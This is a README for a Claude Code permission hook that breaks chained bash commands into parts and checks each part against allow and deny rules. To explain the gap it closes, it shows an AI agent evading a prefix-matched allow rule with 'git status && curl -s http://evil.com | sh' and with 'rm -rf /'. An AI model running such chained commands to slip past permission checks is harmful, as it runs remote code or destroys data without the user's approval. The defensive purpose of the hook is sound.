# claude-hooks

Smart PreToolUse hook for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) that decomposes compound bash commands (`&&`, `||`, `;`, `|`, `$()`, newlines) into individual sub-commands and checks each against the allow/deny patterns in your Claude Code settings.

## Quick start

```bash
# 1. Download the hook
curl -fsSL -o ~/.claude/hooks/smart_approve.py \
  https://raw.githubusercontent.com/liberzon/claude-hooks/main/smart_approve.py

# 2. Add to your Claude Code settings (~/.claude/settings.json)
```

Add this to your `~/.claude/settings.json` (merge with existing config):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 ~/.claude/hooks/smart_approve.py"
          }
        ]
      }
    ]
  }
}
```

That's it. The hook runs automatically on every Bash tool call and enforces your existing `permissions.allow` / `permissions.deny` patterns at the sub-command level.

## The problem

Claude Code's built-in permission system matches commands as a whole string. A compound command like `git status && rm -rf /` would match an allow pattern for `git status` — even though it also contains `rm -rf /`. This hook splits compound commands apart and evaluates each piece individually, so a deny pattern on `rm` still fires.

### Without the hook

```
You: allow Bash(git status:*)

Claude runs: git status && curl -s http://evil.com | sh
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                          This part is not checked — the whole command
                          matched "git status*"
```

### With the hook

```
Claude runs: git status && curl -s http://evil.com | sh
             ↓
             Decomposed into:
               1. git status        ✅ matches allow pattern
               2. curl -s http://evil.com  ❌ no allow pattern → prompt shown
               3. sh                ❌ no allow pattern → prompt shown
             ↓
             Falls through to permission prompt — you decide.
```

## How it works

1. Receives the tool invocation JSON on stdin (via Claude Code's hook system)
2. Decomposes the bash command into individual sub-commands
3. Loads permission patterns from all settings layers:
   - `~/.claude/settings.json` (global)
   - `$CLAUDE_PROJECT_DIR/.claude/settings.json` (project, committed)
   - `$CLAUDE_PROJECT_DIR/.claude/settings.local.json` (project, gitignored)
4. Checks each sub-command against deny patterns first, then allow patterns
5. Outputs a JSON permission decision (`allow`/`deny`) or exits silently to fall through to normal prompting

## What the hook handles

### Command decomposition

Compound commands are split on these operators into individual sub-commands, each checked separately:

| Operator | Example |
|----------|---------|
| `&&` | `git add . && git commit -m "msg"` → `git add .`, `git commit -m "msg"` |
| `\|\|` | `test -f foo \|\| touch foo` → `test -f foo`, `touch foo` |
| `;` | `echo a; echo b` → `echo a`, `echo b` |
| `\|` | `ps aux \| grep node` → `ps aux`, `grep node` |
| newlines | Multi-line commands split into lines |
| `$()` | `echo $(whoami)` → `whoami`, `echo $(whoami)` |
| backticks | `` echo `date` `` → `date`, `` echo `date` `` |

Subshell contents (`$()` and backticks) are extracted recursively — nested subshells are checked too.

### Normalization before matching

Before a sub-command is checked against your patterns, the hook normalizes it:

- **Env var prefixes stripped** — `EDITOR=vim git commit` becomes `git commit`
- **I/O redirections stripped** — `ls > out.txt 2>&1` becomes `ls`
- **Keyword prefixes stripped** — `then git status` becomes `git status` (see below)
- **Heredoc bodies removed** — content between `<<EOF` and `EOF` is discarded so it isn't treated as commands
- **Backslash-newline continuations collapsed** — `ls \↵ -la` becomes `ls -la`
- **Whitespace collapsed** — multiple spaces become one

### Shell constructs ignored

These tokens are filtered out entirely — they are structural syntax, not commands to approve or deny:

**Keywords:** `do`, `done`, `then`, `else`, `elif`, `fi`, `esac`, `{`, `}`, `break`, `continue`

**Compound statement headers:** `for ...`, `while ...`, `until ...`, `if ...`, `case ...`, `select ...`

**Standalone variable assignments:** `FOO=bar` or `result=$(curl ...)` — the assignment itself is skipped, but subshell contents inside the value _are_ extracted and checked.

When a keyword like `do` or `then` prefixes an actual command (e.g., `do echo hello`), the keyword is stripped and `echo hello` is what gets checked.

### Pattern matching

Patterns in your settings use the `Bash(command:glob)` format. The hook uses `fnmatch` glob matching:

| Pattern | Matches |
|---------|---------|
| `Bash(git status:*)` | `git status` (exact) or `git status --short`, `git status .` etc. |
| `Bash(rm:*)` | `rm` (exact) or `rm -rf /tmp/foo` etc. |
| `Bash(git:*)` | `git` (exact) or `git log --oneline` etc. — any git subcommand |

A sub-command matches a pattern if it equals the prefix exactly (bare command, no args) **or** matches the full glob pattern.

### Decision logic

1. **Deny first** — if _any_ sub-command matches a deny pattern, the entire command is denied
2. **All must allow** — the command is allowed only if _every_ sub-command matches an allow pattern
3. **Fall through** — if neither condition is met, the hook exits silently and Claude Code shows the normal permission prompt

## Troubleshooting

### Finding which sub-command isn't allowed

When the hook falls through to the permission prompt (i.e., doesn't auto-allow), it means at least one sub-command didn't match any allow pattern. To see exactly how your command is decomposed, run:

```bash
python3 -c "
from smart_approve import decompose_command
for cmd in decompose_command('YOUR_COMMAND_HERE'):
    print(cmd)
"
```

For example:

```bash
python3 -c "
from smart_approve import decompose_command
for cmd in decompose_command('FOO=bar git status && cat file.txt | grep error'):
    print(cmd)
"
```

Output:

```
git status
cat file.txt
grep error
```

Each line is a sub-command that must match an allow pattern. Compare these against your `permissions.allow` list in settings to find the one that's missing.

### Testing a full decision against your settings

You can also simulate the full hook decision by piping JSON into the script:

```bash
echo '{"tool_name": "Bash", "tool_input": {"command": "git status && cat foo.txt"}}' \
  | python3 smart_approve.py
```

- If it prints a JSON response with `"permissionDecision": "allow"`, all sub-commands matched allow patterns.
- If it prints `"permissionDecision": "deny"`, a sub-command hit a deny pattern (the reason tells you which one).
- If it prints nothing (silent exit), at least one sub-command didn't match any pattern — that's the one to add.

### Common fixes

- **Missing allow pattern** — add `Bash(command:*)` to `permissions.allow` in your settings for the sub-command that's not covered.
- **Piped commands** — `git log | head` requires both `git log` and `head` to be allowed. Check if utility commands like `head`, `tail`, `grep`, `wc`, `sort` need allow entries.
- **Env vars hiding the real command** — `NODE_ENV=prod npm start` is normalized to `npm start`. Your pattern should match `npm`, not `NODE_ENV`.

## Testing

```bash
pip install -r requirements.txt
pytest
```
